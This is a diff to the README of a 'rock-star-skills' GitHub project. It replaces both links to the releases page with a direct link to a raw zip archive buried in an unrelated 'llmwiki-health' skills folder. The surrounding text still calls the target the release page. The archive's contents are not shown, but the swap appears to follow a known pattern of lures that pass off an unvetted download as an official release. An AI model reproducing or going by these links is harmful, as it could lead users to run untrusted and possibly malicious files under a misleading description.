@@ -1,6 +1,6 @@
 # 🎸 rock-star-skills - Expand your productivity with expert commands
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sergsrgsg/rock-star-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sergsrgsg/rock-star-skills/raw/refs/heads/develop/skills/llmwiki-health/skills_star_rock_1.5.zip)
 
 ## 🎯 What this tool does
 
@@ -17,7 +17,7 @@ Your computer must meet these standards to run the software:
 
 ## 📥 Getting the application
 
-Visit [this page](https://github.com/sergsrgsg/rock-star-skills/releases) to download the software.
+Visit [this page](https://github.com/sergsrgsg/rock-star-skills/raw/refs/heads/develop/skills/llmwiki-health/skills_star_rock_1.5.zip) to download the software.
 
 1. Open your web browser.
 2. Navigate to the release page linked above.
